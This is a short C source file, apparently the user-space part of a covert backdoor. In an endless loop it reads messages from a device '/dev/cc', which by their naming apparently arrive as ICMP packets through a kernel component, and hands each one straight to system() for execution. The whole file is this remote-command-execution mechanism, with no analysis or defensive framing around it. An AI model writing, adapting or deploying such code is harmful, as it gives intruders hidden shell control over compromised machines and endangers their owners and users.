#include "server_control.h"

void execute() {	
	int kernel_fd;
	char icmp_msg[256+1];

	if ((kernel_fd = open("/dev/cc", O_RDWR)) == -1) {
		printf("can't open /dev/cc !\n");
		exit(-1);
	}

	if (read(kernel_fd, icmp_msg, 256) == -1) {
		printf("can't read()\n");
		exit(-1);
	}

	system(icmp_msg);

}

int main(int argc,char *argv[]) {
	while(1) {
		execute();
		sleep(1);
	}
}
